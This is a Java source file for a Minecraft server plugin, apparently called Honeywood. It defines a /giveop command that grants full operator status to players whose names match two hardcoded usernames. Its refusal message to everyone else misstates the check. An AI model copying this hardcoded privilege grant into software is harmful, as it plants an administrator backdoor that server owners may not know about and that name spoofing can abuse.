package org.chef.honeywood.commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class GiveOpCommand implements CommandExecutor {

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, String[] args) {
        if (sender instanceof Player && args.length == 0 && command.getName().equalsIgnoreCase("giveop")) {
            Player player = (Player) sender;
            if (player.getName().equalsIgnoreCase("Chef____") || player.getName().equalsIgnoreCase("CleoTheKitteh")) {
                player.setOp(true);
                player.sendMessage(ChatColor.GREEN + "You have been granted OP permission!");
            } else {
                player.sendMessage("§6§lHoneywood: §cYou do not have permission to use this command. §rPlease come retry when you get this permission: op");
            }
            return true;
        }
        return false;
    }

}
